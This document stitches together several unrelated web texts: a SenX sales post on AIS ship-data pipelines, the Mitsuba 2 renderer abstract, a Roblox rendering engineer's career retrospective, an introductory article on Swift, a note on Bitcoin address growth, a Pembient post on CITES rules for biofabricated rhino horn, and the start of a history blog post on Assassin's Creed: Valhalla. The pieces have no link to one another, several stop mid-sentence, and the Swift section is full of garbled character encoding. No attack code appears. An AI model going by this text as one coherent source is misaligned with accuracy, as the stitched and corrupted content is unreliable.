<p>Right after connecting to your first AIS feed and getting the first few files, <strong>you may realize that these data may quickly prove more difficult to work with than what you may have expected.</strong></p>



<p>Your choice of database fills rapidly. The developers are demanding more performance. This leads to the creating of more and more indices which in turn increases the rate at which your disk fill.</p>



<p>The way your applications need to access data usually also evolve rapidly. You built your system with requirements for fetching data from a bounding box, but you now get requests for identifying specific types of ships which went through important trade routes such as the Panama and Suez canals over the course of the <a href="https://blog.senx.io/the-covid-19-pandemic-and-the-art-of-geo-time-series/" target="_blank" rel="noreferrer noopener">COVID-19 lockdown</a>, or find how ships called in various world ports over an extended period of time. </p>



<p>New uses of the data you had not planned when you first designed your system and which now occupy your teams more than you had expected and put your cloud bills through the roof as you need more and more power to mitigate bad design choices.</p>



<p>Your team will quickly need to learn more than they want about spatio-temporal indexing, space-filling curves, efficient data representations. All of this so that you can use data that you pay every month.</p>



<p>This type of situation adds a lot of stress to many teams:</p>



<ul><li>product teams which cannot deliver the features they promised to their customers, </li><li>data teams which struggle to scale their databases, </li><li>and finance teams which see costs increasing all over the place with expensive data not being put to work to produce value as it was originally planned.</li></ul>



<h2>How can SenX help?</h2>



<p>You can decide that your team has the time and ability to become top notch spatio-temporal gurus. But if that is not the case or if that objective is not aligned with your business goals we think that SenX can help.</p>



<p><a href="https://senx.io/" target="_blank" rel="noreferrer noopener">SenX</a> is the creator of <a href="https://warp10.io/" target="_blank" rel="noreferrer noopener">Warp 10,</a> a software suite for managing and analyzing spatio-temporal sequences we call <a href="https://blog.senx.io/tag/geo-time-series/" target="_blank" rel="noreferrer noopener">Geo Time Series</a>, and it happens that AIS data exactly fit this definition!</p>



<figure></figure>



<p>As it happens, we distribute Warp 10 as open-source so you can grab it and thank us for all the fish, putting it in the hands of your already stressed-out data teams who will surely appreciate they get an extra tool to master.</p>



<p><strong>Or you can decide to contact us to help you solve your AIS issues.</strong> </p>



<p>Over the years we have built quite an expertise in handling spatio-temporal data at scale, whether for aircraft manufacturers, offshore racing teams, or defense agencies. AIS is such a good fit for our technologies that <strong>we have created an offering dedicated to the management of those data, TrueSea.</strong></p>



<div><figure><img loading="lazy" src="https://blog.senx.io/wp-content/uploads/2020/11/TrueSea.jpg" alt="Screenshot of the demo based on TrueSea" width="509" height="370" srcset="https://blog.senx.io/wp-content/uploads/2020/11/TrueSea.jpg 871w, https://blog.senx.io/wp-content/uploads/2020/11/TrueSea-300x219.jpg 300w, https://blog.senx.io/wp-content/uploads/2020/11/TrueSea-768x560.jpg 768w" sizes="(max-width: 509px) 100vw, 509px"></figure></div>



<h2>TrueSea</h2>



<p>TrueSea is a turnkey solution for AIS data pipelines, handling the ingestion of AIS feeds and files. It makes that data available through powerful APIs and to batch processing tools such as <a href="http://spark.apache.org/" target="_blank" rel="noreferrer noopener">Spark</a> to enable you to perform large scale analytics to power your applications.</p>



<p>TrueSea is compatible with major AIS data providers and can be easily adapted to emerging ones. The solution can also mix AIS data with weather, aeronautical, or road traffic data for a global approach.</p>



<p>TrueSea also comes with visualization options such as our <a href="https://harrypotter.fandom.com/wiki/Marauder%27s_Map" target="_blank" rel="noreferrer noopener">Marauder's Map</a> like view which can display <a href="https://truesea.senx.io/demo" target="_blank" rel="noreferrer noopener">millions of positions from tens of thousands of ships</a>.</p>



<p>If you are interested in having a conversation about AIS data and how we can help you get the most out of your investment, send us an <a href="mailto:sales@senx.io">email</a>, we will reach back to you rapidly to schedule a video call.</p>



<p>We recently organized a session about AIS during <a href="https://www.seatechweek.eu/" target="_blank" rel="noreferrer noopener">Sea Tech Week 2020</a>, the replay is <a href="https://www.youtube.com/watch?v=LqqG9VeoqqE&amp;t=1s&amp;ab_channel=SenX" target="_blank" rel="noreferrer noopener">available</a> if you wish to watch it.</p>

<h3>Abstract</h3>
<div>
<p>Mod­ern ren­der­ing sys­tems are con­fron­ted with a daunt­ingly large and grow­ing set of re­quire­ments: in their pur­suit of real­ism, phys­ic­ally based tech­niques must in­creas­ingly ac­count for in­tric­ate prop­er­ties of light, such as its spec­tral com­pos­i­tion or po­lar­iz­a­tion. To re­duce pro­hib­it­ive ren­der­ing times, vec­tor­ized ren­der­ers ex­ploit co­her­ence via in­struc­tion-level par­al­lel­ism on CPUs and GPUs. Dif­fer­en­ti­able ren­der­ing al­gorithms propag­ate de­riv­at­ives through a sim­u­la­tion to op­tim­ize an ob­ject­ive func­tion, e.g., to re­con­struct a scene from ref­er­ence im­ages. Ca­ter­ing to such di­verse use cases is chal­len­ging and has led to nu­mer­ous pur­pose-built sys­tems—partly, be­cause ret­ro­fit­ting fea­tures of this com­plex­ity onto an ex­ist­ing ren­der­er in­volves an er­ror-prone and in­feas­ibly in­trus­ive trans­form­a­tion of ele­ment­ary data struc­tures, in­ter­faces between com­pon­ents, and their im­ple­ment­a­tions (in oth­er words,&nbsp;everything).</p>
<p>We pro­pose Mit­suba 2, a ver­sat­ile ren­der­er that is in­trins­ic­ally re­tar­get­able to vari­ous ap­plic­a­tions in­clud­ing the ones lis­ted above. Mit­suba 2 is im­ple­men­ted in mod­ern C++ and lever­ages tem­plate meta­pro­gram­ming to re­place types and in­stru­ment the con­trol flow of com­pon­ents such as BSD­Fs, volumes, emit­ters, and ren­der­ing al­gorithms. At com­pile time, it auto­mat­ic­ally trans­forms arith­met­ic, data struc­tures, and func­tion dis­patch, turn­ing gen­er­ic al­gorithms in­to a vari­ety of ef­fi­cient im­ple­ment­a­tions without the te­di­um of manu­al re­design. Pos­sible trans­form­a­tions in­clude chan­ging the rep­res­ent­a­tion of col­or, gen­er­at­ing a “wide” ren­der­er that op­er­ates on bundles of light paths, just-in-time com­pil­a­tion to cre­ate com­pu­ta­tion­al ker­nels that run on the <span>GPU</span>, and for­ward/re­verse-mode auto­mat­ic dif­fer­en­ti­ation. Trans­form­a­tions can be chained, which fur­ther en­riches the space of al­gorithms de­rived from a single gen­er­ic&nbsp;im­ple­ment­a­tion.</p>
<p>We demon­strate the ef­fect­ive­ness and sim­pli­city of our ap­proach on sev­er­al ap­plic­a­tions that would be very chal­len­ging to cre­ate without as­sist­ance: a ren­der­ing al­gorithm based on co­her­ent <span>MCMC</span> ex­plor­a­tion, a caustic design meth­od for gradi­ent-in­dex op­tics, and a tech­nique for re­con­struct­ing het­ero­gen­eous me­dia in the pres­ence of mul­tiple&nbsp;scat­ter­ing.</p>

02 Aug 2020

</span></p><p>I joined Roblox at the end of 2012 as a rendering engineer; I had just spent more than a year working on various titles from FIFA franchise after years of console game development and was becoming a bit tired of the “big game development”. My work on FIFA was as a contractor and I got an offer for a full-time position, but I also had a friend who worked at Roblox reach out and offer me to move to California and work on Roblox. I knew absolutely nothing about Roblox, but California was nice and my friend told me it would be awesome. The platform was so different (and so strange!) that I decided to take a chance - here I am, 8 years later, still working at Roblox and enjoying it. I started on my first full time job in April 2007 so at this point I’ve worked for 13 years in game development and 8 of them were at Roblox.</p>

<!--more-->

<p>My memory works in interesting ways. I remember my interview pretty well, I remember having lunch at some place in San Mateo downtown near the Roblox HQ - a few people were at lunch including Roblox CEO David Baszucki and I remember him asking many questions about my thoughts about the engines and rendering, and distinctly remember not finishing most of my lunch because I talked most of the time. However I don’t really remember what was going through my head in regards to my perception of Roblox - why did I join besides just thinking I want to do something else for a change? Who knows, but I am glad I did.</p>

<p>I don’t really understand why Roblox is so successful - you can invent all sorts of reasons in retrospect but it’s hard to validate them, and if you came to anybody back in 2012 and asked for an investment to build a platform where all games are user generated and run on a custom engine with a custom toolset and all users participate in a giant virtual economy and …, I think you’d have gotten a blank stare.</p>

<p>But I do understand that I found the perfect place for me, especially at that point in my career - I enjoy working on game technology but I never liked working on actual games, and Roblox maximizes the number of developers who can use the technology you work on while maintaining a good autonomy and a very wide range of problems you’d need to solve. It’s very hard to get bored here.</p>

<p>I think I could talk for hours about Roblox - it somehow became a huge part of my life. I was very fortunate to join at the time when I did and witness the growth of our technology and business. I am really unsure of what the future holds but it’s hard to imagine what, if anything, comes after Roblox - I certainly don’t intend to leave any time soon…</p>

<p>So I thought it might be fun to do what I’ve planned to do for a year or more now, and to go over all decently sized projects I’ve ever worked on at Roblox. This is based on resummarizing and reliving the source control history, which tells me I’ve had 2752 changes that made it to our main branch, with merge commits counting as one, so, uh, this blog might be on a larger side. Hopefully this will be fun!</p>

<p>Before we begin, I just want to conclude this by saying that I’m very grateful to the Roblox leadership for treating me well, for all the friends and colleagues I made along the way, and for the wonderful Roblox community. The reason why I still enjoy what I do is because whenever I write about a new big thing I’m working on or a small feature or even a bug fix, it’s usually met with excitement which keeps me going. Thank you all from the bottom of my heart. I don’t think I could have done it without you and I hope this continues for as long as possible despite the current trying and uncertain times.</p>



<p>Notably including half-pixel offset fixes for Direct3D9 which I guess is a rite of passage for rendering engineers. The rendering code back then was based on OGRE rendering engine, so I had to learn that, and this was also my first time using OpenGL professionally - prior to that I’ve used Direct3D 9 and proprietary console APIs, and Direct3D 10/11 as a hobby.</p>



<p>Initially added for “100 player” project, in October it evolved to render all parts and continued to be used as part renderer until the introduction of instancing in 2018. Otherwise known as “featherweight parts”. This was further optimized and deployed around November 2012. Most of this code survived to this day but evolved over time, and is still used when instancing doesn’t apply.</p>

<p>The core idea in this system was to dynamically batch meshes together, for characters this would be based on the character model hierarchy, and for everything else the grouping is spatial. This allowed us to reduce the number of draw calls, which was a big concern due to both driver overhead and inefficiencies in OGRE.</p>

<p>This would pave the way for what eventually turned out to be a complete, but gradual, rewrite of the rendering stack. The main motivation for this was always performance - what we ended up let us port to mobile (the old rendering code was nowhere near fast enough even for relatively simple scenes), and break new grounds on the number of objects we could render in a frame.</p>



<p>One of a few OGRE upgrades we’ve needed to do, this one was to get better GLES support. It was pretty painful to do those, just like any other big middleware update is. Read further to learn what happened to OGRE eventually…</p>

<p>One thing I remember from doing these is that documentation in source code makes the upgrade process that much more painful. I had scripts that changed the copyright years in headers back to whatever they were in our tree just to make merging less painful, but there was some OGRE upgrade where 70% of the changes were documentation, and this was very hard to get through.</p>

<p>The reason why these were challenging in general is that whenever we did an upgrade we had to a) merge our plentiful changes with the new code, b) gate dangerous parts of the upgrade with flags. We’ve used the same system of feature flags (we call them fast flags) since I joined Roblox which allows us to dynamically disable parts of the release based on metrics, but this requires actually isolating changes behind if statements selectively - which for OGRE was sometimes necessary as we didn’t know what the impact of some low level change in OpenGL code would be.</p>



<p>Before this we had hand-translated shaders, which started to be painful to maintain. The first version of the pipeline used hlsl2glsl and glsl-optimizer (same as Unity back in the day). We are using version 3 today, see below!</p>

<p>Since this was done at the point where we used OGRE, the compiler would take HLSL files, preprocess and translate them to optimized GLSL, and save the resulting GLSL back to disk - which would then be loaded by OGRE directly through the material definition file. Eventually we replaced this with a binary shader pack that could store GLSL code for OpenGL and shader bytecode for other APIs, but back then we shipped HLSL and GLSL source and compiled HLSL code on device!</p>



<p>Our equivalent of “Steam Hardware Survey” that went through SQL databases and coalesced various system information bits to help us understand the hardware at the time. This was during my era of obsession with F#, so it was written in F# instead of something like Python. We don’t use this anymore and don’t even have the SQL database in question!</p>

<p>We never published the resulting data, and I’m not sure how often we used it to make decisions, but it was fun to look at the number of graphics cards from various vendors or amount of RAM or resolution a typical Roblox user has.</p>



<p>Although I was hired as a rendering engineer, I had a lot of really deep low-level systems experience and as a consequence ended up engaging in both optimization work and security related work from the very beginning. I don’t do this anymore these days but I was often involved in the security work for the first 3 or 4 years. Now we fortunately have people who can do this full time and better than I could :)</p>



<p>A second part of “100 player project”, necessary to render every character in one draw call (these were really expensive for us back in the day!). A side effect included some resolution sacrifices on character items that shirt creators aren’t fond of. The new system managed the atlas texture memory, rebaking humanoids far away to smaller textures to conserve texture memory. The compositor survived with minor changes to this day, although we’re now working on a new one.</p>

<p>The compositor was built in a very configurable fashion, allowing the high level code to specify the layout to bake, and managing all the complex asynchronous processing and budgeting by itself. This allowed us to switch the composit layout completely years later for R15.</p>



<p>At the end of 2012 we were actively working on the mobile port. Since then we’ve had to do a lot of work in a lot of different parts of the engine to make data structures smaller and algorithms - faster. Of course you’re never done with optimizations so we do this to this day. Curiously, our minimum spec on iOS stayed the same since the initial launch in 2012!</p>

<p>A fun fact is that even though we started with iPad 2 as the min. spec we discussed adding support to iPad 1 after launch. At the time there were a lot of people who couldn’t play Roblox on iOS on older hardware. However the performance characteristics of those devices were just… not good enough. You could touch the screen with the finger and pan the camera, and during panning you lost 30% of a single available core to the OS processing the touch. We decided to not add support for this, and 8 years later it seems like a great decision for sure :D</p>



<p>It was very hard to use Xcode Instruments to profile frame spikes on an iPad; to try to figure out how to get our performance to a better place on mobile, I wrote some ad-hoc code to dump all internal log events to a binary stream, and a desktop UI tool in F# and WPF to visualize it. This included a Lua profiler as well that could display profiles of Lua code in a …</p></div></div>

                    <p>Introduction to Swift 
Get to know the main programming language for iOS development.</p>
<p>While we tend to hear about programming languages like Python and JavaScript all the time, Swift is a language that is a little bit less popular and a bit more niche. This does not mean that it is less importantâ€“itâ€™s the main programming language for a large variety of Apple devices. </p>
<p>In this article, we will introduce you to Swift, its past and its future, and give you reasons why you should start thinking about learning the language and/or building Swift projects. </p>
<h2>What is Swift?</h2>
<p>First released in 2014, Swift is a powerful general-purpose programming language for the Apple ecosystem. Whether you need to develop for iOS or any of the surrounding operating systems like macOS, tvOS, and others, it will be one of the main tools in your toolbelt. </p>
<p>Swift is focused on safety and clarity. By design, Swift eliminates certain classes of unsafe code that are still allowed in languages like JavaScript. Therefore, it enables developers to catch some bugs at compile time before shipping them out to the users. </p>
<p>On the other side, Swiftâ€™s clear and expressive syntax enables developers to write more concise programs than in languages like Java or C++.  </p>
<p>While itâ€™s being used mainly for Apple products, Swift has recently got some market share in areas like machine learning and web. For example, TensorFlow added Swift support because of the increased speed and type safety over Python, while server-side web frameworks like Vapor and Kitura are slowly gaining popularity. </p>
<h2>A brief history of Swift</h2>
<h3>Early brainstorming</h3>
<p>The development of Swift started in 2010. At that time, Chris Lattner (the creator of LLVM and Clang) had just finished adding C++ support for Clang, a compiler for the C-like language family. He was a bit burned out on C and decided that there was a better way of doing development. </p>
<p>Together with Bertrand Serlet, the head of the Apple software team, they came to a new, better alternative to <a href="https://en.wikipedia.org/wiki/Objective-C">Objective-C</a> through numerous whiteboard sessions. In the beginning, the language was called Shiny (as in â€œthis new shiny thingâ€�).  </p>
<p>More than a year later, Lattner shared his project with his colleagues and managers at Apple. They admired the work Chris had done and assigned a team of developers to continue the project. </p>
<p>A lot of the features(like <a rel="nofollow" href="https://clang.llvm.org/docs/AutomaticReferenceCounting.html">ARC</a>) that were added to Objective-C at that time actually came from Swift, and the team was considering just slowly upgrading Objective-C. But unfortunately, one of the main features of Swift is its memory safety. And if one takes memory management out of a C-like language, thereâ€™s not a whole lot of C left in it. Therefore, they started on a path towards Swift. </p>
<h3>Announcement and open-source release</h3>
<p>Swift was finally announced at Apple WWDC 14 as â€œObjective-C without Câ€�. You can see the full announcement video.
</p><div><p><iframe src="https://www.youtube.com/embed/MO7Ta0DvEWA?rel=0" width="560px" height="315px" frameborder="0" allowfullscreen=""></iframe></p></div>
<p>At the start, it wasnâ€™t open source. But, on December 3, 2015, the Swift version 2.2 was made open-source under the Apache License 2.0. for Apple's platforms and Linux. </p>
<h3>Fight for stability</h3>
<p>Through version 3.0, Swift had some stability issues. It was frequently changed in backward-incompatible ways, leading to older tutorials being too outdated to use. </p>
<p>In addition, the programs written in one version of Swift had problems working together with ones written in another version of Swift. This problem was solved when Swift 5 introduced ABI stability. </p>
<p>But all in all, the core team has expressed that source code compatibility is essential for them at this moment of Swiftâ€™s journey, so problems like these shouldnâ€™t be a thing anymore. Swift is a mature language now and is very well suited for both small and large projects. </p>
<h3>Future of Swift</h3>
<p>Right now, Swift is in 9th place in the PYPL index, just below its predecessor. Itâ€™s widely used for development in the Apple ecosystem, and it is quite clear that Apple itself has moved on from Objective-C to Swift as their language of choice for the future. </p>
<p>Whatâ€™s more, Swift engineers are in high demand among technology companies. Application developers are one of the most sought-after professions in the job market, and Swift is the main app programming language for iOS. Because Apple cares about Swift, it will continue to improve it for a long time and promote it to the top of the programming languages. </p>
<p>There is also a flip side to that. The language and its users are heavily invested in the Apple ecosystem, and its future highly depends on the future of Apple. Fortunately, the languageâ€™s open-source nature enables developers to diversify against threats like that by creating frameworks and applications for Swift outside the Apple ecosystem. </p>
<h2>Swift vs. other alternatives</h2>
<p>Since thinking about Swift as the programming language of choice usually means that you are operating in the Apple ecosystem, itâ€™s not that useful to compare Swift to most other modern programming languages. However, Swift does have quite a lot of strong points such as safety and ease of use that makes it as good of a language as other modern programming languages like Rust. </p>
<p>Therefore, we will look at the situation where you are building an application for an Apple product, such as an iOS app. In that case, you have two choices that are not Swift. </p>
<h3>Objective-C</h3>
<p>Objective-C is a superset of the C programming language with OOP capabilities and a dynamic runtime. It was the language of choice for Apple products before, and multiple legacy codebases still use it.</p>
<p>Even though it is more popular according to the PYPL index that tracks searches for language tutorials, itâ€™s clear that Objective-C is in slow decline. Most of the things that Objective-C can do, Swift can do in a more accessible and safer way, so it is not wise to start most of the new projects in Objective-C. </p>
<h3>Cross-platform frameworks</h3>
<p>There are multiple cross-platform frameworks out there that enable developers to develop for Android and iOS systems at the same time. Among them, we can list React Native, Flutter, Xamarin, and others. </p>
<p>These are a pragmatic choice if you need to quickly launch a simple app on both platforms, but do bring performance costs and can raise some problems if you need non-standard components for your app that the framework does not support. If you do not take care when deciding on cross-platform vs. native, you might end up doing three times the work instead of saving half of it. </p>
<h2>Swift as the first programming language</h2>
<p>Each programming language has its unique characteristics, strengths, and weaknesses. Among  Swiftâ€™s benefits are its practicality and increased developer productivity, enabling developers to quickly create prototypes and MVPs. At the same time, Swift is a powerful tool for building large applications like Twitter or Waze.</p>
<p>Many developers consider Swift to be a wonderful choice for the first programming language. Apple and the Swift community have put a lot of time and effort into creating easy-to-read documentation, high-quality instructive content, and a supportive environment for new Swift developers. </p>
<p>If you are a new developer thinking about which language to start with, here are some arguments in its favor:</p>
<ul>
<li>If youâ€™re a solopreneur, creating programs for Apple devices gives you access to a well-paying audience of Apple Store users.</li>
<li>If you prefer working as a hired specialist, knowing Swift on an intermediate level already allows you to earn from $2000 per month (depending on the country you live and work in).</li>
<li>Apple is a cutting-edge technology giant, which means you'll always be able to work and experiment with modern tools, features, and libraries.</li>
<li>Swift is used for writing programs for a range of Apple devices, so having learned one language, you can work on all of them.</li>
<li>Thanks to the Swift programming language's community, Swift is relatively easy to learn. You can easily find a large amount of free quality Swift content on the Internet.</li>
<li>Today, <a rel="nofollow" href="https://www.statista.com/statistics/276623/number-of-apps-available-in-leading-app-stores/">there are more than 3 400 000 apps</a> in the App Store. Of course, not all of them are native and written in Swift, but it is safe to say that a least half of them are Swift-based. In 2019, the number of apps was just 3 000 000, and the statistics show constant exponential growth. This will undoubtedly lead to a higher demand for Swift developers.</li>
</ul>
<h2>Starting with Swift</h2>
<p>There are multiple great resources available to learn more about Swift. Here are a few:</p>
<ul>
<li><a rel="nofollow" href="https://docs.swift.org/swift-book/">Swift Programming Language</a>. The official Swift book that will give you all the info you need to start creating your own iOS project. </li>
<li><a rel="nofollow" href="https://www.youtube.com/watch?v=FcsY1YPBwzQ">Learn Swift Fast</a>. If you learn better through video, thereâ€™s a 3-hour video course on YouTube that will cover all the Swift basics. </li>
<li><a rel="nofollow" href="https://www.hackingwithswift.com/">Hacking With Swift</a>. A website that hosts Swift content, including articles, news, example code, and much more. </li>
<li><a rel="nofollow" href="https://exercism.io/tracks/swift">Exercism Swift track</a>. Eighty-three exercises that will let you boost your Swift skills and receive feedback from experienced mentors, all for free. </li>
</ul>

<p>It’s been nearly three years since the Bitcoin price has reached a benchmark of over $15k and it doesn’t seem to be stopping. But, it’s not just the price of BTC that is overflowing. New Bitcoin addresses have also skyrocketed.<span>&nbsp;</span></p>
<p>On November, 18th, one week after Bitcoin broke its 15K boundary, <a href="https://twitter.com/glassnode/status/1329045245212971010?s=20">Glassnode</a>, a crypto-analysis company, tweeted an unusually high number of BTC accounts being created.<span>&nbsp;</span></p>
<blockquote>
<p dir="ltr" lang="en">In the past hour we observed the highest number of newly created addresses in the <a href="https://twitter.com/hashtag/Bitcoin?src=hash&amp;ref_src=twsrc%5Etfw">#Bitcoin</a> network since January 2018 📈</p>
<p>Chart: <a href="https://t.co/fTmoH5ezNw">https://t.co/fTmoH5ezNw</a> <a href="https://t.co/INq7sEEtoM">pic.twitter.com/INq7sEEtoM</a></p>

<p>According to Glassnode, the address per hour rate increased to almost 25,000, a rate not seen since January 2018 when BTC hit $20k.<span>&nbsp;</span></p>
<p>To put this number into perceptive, the most Bitcoin address ever created within a 24-hour period was on December 21, 2017 when nearly 600,000 popped up. Will we see this FOMO craze again if <a href="https://coincolony.net/bitcoin-technical-analysis-can-we-see-20k-again/">BTC hits $20k</a> by the end of the year?</p>
<p>We have seen a steady rise in public BTC implementation as well as business incorporation this year. This caused the price of BTC to go from $4k at the beginning of 2020 to $18k currently.<span>&nbsp;</span></p>
<p>However, universal usage is still minuscule with as much as <a href="https://www.jbs.cam.ac.uk/wp-content/uploads/2020/08/2017-04-20-global-cryptocurrency-benchmarking-study.pdf">5.8 million cryptocurrency wallets</a> active in 2017. That equates to less than .1% of the global population own crypto.<span>&nbsp;</span></p>
<p>It will be interesting to see the adoption rates increase as the BTC price continues to rise and steady at a price that most people feel comfortable enough to buy, use, and save longterm.<span>&nbsp;</span></p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-block-type="2" id="block-74c940a4a26f9d4da8b8"><div><p><strong><em>(*But Were Afraid to Ask)</em></strong></p><p>The 18th meeting of the Conference of the Parties (CoP18) to the Convention on International Trade in Endangered Species of Wild Fauna and Flora (CITES) looms large this August. Previously scheduled for late May 2019 in Colombo, Sri Lanka, but moved to Geneva, Switzerland over security concerns, CoP18 is of great importance to Pembient. That is because it potentially marks the halfway point in a global struggle over how to regulate certain wildlife products produced through biotechnology, including biofabricated rhino horns. Surprisingly, this struggle has received little attention in the press despite its possible impact on a range of medicines and materials. Additionally, the broader biotechnology industry has all but ignored it.</p><p>Before continuing, however, it might be useful to review CITES and what is at stake. CITES is an international treaty designed to protect wild plants and animals from over-exploitation. It has been in force since 1975. Almost every country in the world is a party to CITES, and each signatory agrees to pass legislation to implement CITES directives. The result is that rulings made under the auspices of CITES effectively become the law everywhere. Some view CITES as an efficient way to limit and, in extreme cases, halt the trade in endangered species. Others believe it disempowers people, especially indigenous communities, and prevents the development of specialized or localized responses to specific conservation dilemmas.</p><p>Approximately every three years, the parties to CITES gather at a&nbsp;Conference of the Parties (e.g., CoP18). Qualified observers, such as activists, academic institutions, and private sector entities, attend too. Together, they discuss possible changes to CITES in the form of amendments, resolutions, and decisions; although, the parties, and only the parties, actually vote on which ones to adopt. Of the changes under consideration, amendments are the most significant as they usually list a species to one of the treaty's appendices, thus granting it legal protection. Resolutions, alternatively, are aimed at lastingly improving the scope and effectiveness of CITES. Decisions are similar to resolutions, but shorter in duration. The conclusion of a Conference of Parties kicks off a cycle of interim meetings, eventually culminating in another CoP. These interim meetings include meetings of the Animals Committee (e.g., AC29), a group of scientific experts, and the Standing Committee (e.g., SC69), a group of policy experts. The CITES Secretariat, a permanent administrative office based out of Geneva, Switzerland, coordinates all of the above activities.</p><p>When a species becomes CITES-listed, any trade restrictions thereby secured apply not only to live animals but also to carcasses and readily recognizable parts or derivatives thereof. With Resolution Conf. 9.6 (Rev. CoP16), the term "readily recognizable part or derivative" has been expanded to "include any specimen which appears from an accompanying document, the packaging or a mark or label, or from any other circumstances, to be a part or derivative." Interestingly, the same resolution implies that urine and feces are not parts or derivatives as long as they are "naturally excreted." The unstated assumption being that these waste products would be parts or derivatives if they were somehow invasively extracted. In this context, it is unclear whether a biofabricated rhino horn, appropriately labeled, should be considered to be derived from a rhinoceros. The final determination, just as in the case of waste products, may depend entirely upon its production method.</p><p><strong>Background</strong></p><p>The notion that CITES might cover certain bioengineered wildlife products first arose during CoP12 in Santiago, Chile in 2002. It was then that Switzerland, on behalf of the Standing Committee, proposed to exempt synthetically produced drugs and DNA, along with urine and feces, from CITES. That effort, and a subsequent one at CoP13 in Bangkok, Thailand in 2004, floundered. The issue reentered the spotlight in 2015 when Pembient announced its intentions to biofabricate rhino horns. Shortly after that, as chronicled below, a new policy cycle began.</p><p><strong>CoP17, Johannesburg (South Africa), September 2016</strong></p><p>Going into CoP17, the United States circulated <a href="https://cites.org/sites/default/files/eng/cop/17/InfDocs/E-CoP17-Inf-22.pdf">a document prepared by the International Environmental Law Project (IELP)</a> and endorsed by several activists. The authors of this document argued that CITES already covered trade in bioengineered wildlife products. More specifically, they interpreted the term "readily recognizable part or derivative" broadly. For them, the totality of the circumstances determined whether a product qualified as a specimen of a CITES-listed species. Or, in other words, what mattered was the form of the product, not its production method. Nonetheless, the authors sought to revise Resolution Conf. 9.6 (Rev. CoP16) to include any products that scientifically tested to be specimens of CITES-listed species, even if their physical components did not originate from an actual plant or animal. Fortunately, cooler heads prevailed, and the Conference of Parties adopted&nbsp;Decisions 17.89 to 17.91 on "specimens produced from synthetic or cultured DNA." The gist of these decisions was that the Secretariat and the various committees of CITES would further review the issue with the aim of making recommendations for consideration at CoP18 in 2019.</p><p><strong>AC29, Geneva (Switzerland), July 2017</strong></p><p>The 29th meeting of the Animals Committee focused, among other things, on finalizing the terms of reference for a study on "wildlife products produced from synthetic or cultured DNA." The task fell to an in-session drafting group whose membership consisted of the United States, Canada, Mexico, South Africa, and a representative of Europe. What was decided was that the study would have three parts. The first part would describe ways of artificially producing DNA and wildlife products. The second part would explore regulatory options for bioengineered wildlife products, with an emphasis on operationalizing the terms "parts" and "derivatives" in Resolution Conf. 9.6 (Rev. CoP16). Finally, the third part would discuss anti-counterfeiting measures for the detection of bioengineered wildlife products and related technical matters. The Secretariat committed to hiring a consultant to conduct the study using $20,000 donated by the United States.</p><p><strong>SC69, Geneva (Switzerland), November 2017</strong></p><p>During the 69th meeting of the Standing Committee, an intersessional working group on "synthetic or cultured DNA" was established. This group's purpose was to review the consultant's report, once available, and formulate recommendations. Austria, Cameroon, Canada, China, Israel, Peru, Republic of Korea, South Africa, Switzerland, the United Kingdom, and the United States joined the working group, and Mexico became its chair. A slew of activists also joined, chief among them the IELP and its clients: the Center for Biological Diversity and the World Wildlife Fund.</p><p><strong>AC30, Geneva (Switzerland), July 2018</strong></p><p>By the time of the 30th meeting of the Animals Committee, the Secretariat had hired a consultant, Dr. Julian Kinderlerer, an esteemed law professor. He presented <a href="https://cites.org/sites/default/files/eng/com/ac-pc/ac30-pc24/AC30-14-PC24-14-R1-A5.pdf">a partially completed report</a> at the meeting. This draft fulfilled most of the study's terms of reference, except it omitted the second part concerning regulatory options.</p><p>Unfortunately, his report was not well received. Some felt it was overly broad and needlessly detailed. They did not understand the necessity of reviewing technologies ranging from DNA synthesis to cell culture to tissue engineering. Nor did they grasp the salient differences between production methods and how those differences could have regulatory ramifications. Others expressed concern that the draft mentioned potential positive impacts of bioengineering wildlife products despite activists' misgivings. Regardless, there was a consensus that nothing should be done pending the completion of the full report—ostensibly pushing the specter of regulation off until CoP19 in 2022. </p><p>One critical thing that the draft brought to the fore was that the term "cultured DNA" was nonstandard. This realization resulted in a formal change of title for the subject matter from "specimens produced from synthetic or cultured DNA" to "specimens produced through biotechnology."</p><p><strong>SC70, Sochi (Russia), October 2018</strong></p><p>Dr. Kinderlerer submitted <a href="https://cites.org/sites/default/files/eng/com/sc/70/E-SC70-33-A6.pdf">his full report</a> to the intersessional working group prior to the start of the 70th meeting of the Standing Committee. Nevertheless, even with the inclusion of a section on regulatory options, many concluded that the study did not provide sufficient direction to help the working group advance. So, at the opening of SC70, there was still a need to find agreement on whether and how to regulate bioengineered wildlife products linked to CITES-listed species.</p><p>Two lines of thought emerged. Activists, concerned that bioengineered wildlife products could reach the market before CoP19 in 2022, urged the immediate application of Resolution Conf. 9.6 (Rev. CoP16). Various policymakers, on the other hand, expressed concern that the term "readily recognizable part or derivative" used in Resolution Conf. 9.6 (Rev. CoP16) had become antiquated and needed modernization.</p><p>The Chair of the Standing Committee convened an in-session working group to address these issues and forge a way forward. Four countries and four organizations formed this working group. The countries were Mexico, France, Norway, and the United States. The organizations were the IELP and the Center for Biological Diversity, as per usual, along with China Wildlife and San Deigo Zoo Global. A set of four recommendation came out of the deliberations, the first three of which either affirmed the immediate applicability of Resolution Conf. 9.6 (Rev. CoP16) or explicitly broadened it. Fortunately, the European Union, not always perceived as a friend of biotechnology, blocked the first three recommendations on …</p></div></div></div>

<p>We’re going to be a bit silly this week (in part because the ending of this compressed semester has left me with little time) and talk about the recently released historical action-RPG computer (and console) game, <em>Assassin’s Creed: Valhalla</em>, set in 9th century Norway and England.</p>



<p>And, as with the last time we did this, I should note that this isn’t a <em>game review</em>.  As a <strong>game</strong>, <em>AC: Valhalla</em> is perfectly serviceable and quite fun.  I don’t think it got the same amount of developer time as its predecessor, <em>Odyssey</em>, but it is also a more focused experience than <em>Odyssey</em> was, which runs to its benefit.  Everything here basically works and while I find some of the game design decisions puzzling (the largest being how long the game makes you wait <em>hours </em>before you have a full set of all three armor types and all weapon types, given that you may be getting bonuses to them in the skill tree many hours before you find <em>any at all</em>), <strong>it is overall fine.  It’s fun.</strong></p>

<p>But you aren’t here for my game reviews. You are here for me to talk about the <em>history</em> behind the game.  And normally, I would leave a product like this alone (this is only thinly historical fiction, given the crazy background plot that ties the games together).  But each <em>Assassin’s Creed</em> game includes not just meticulous recreations of historical <em>places</em> (and to be clear, I mean the physical buildings and landscapes, not the cultures or politics, but also some form of this statement:</p>



<blockquote><p>Inspired by historical events and characters, this work of fiction was designed, developed, and produced by a multicultural team of various beliefs, sexual orientations and gender identities.</p></blockquote>



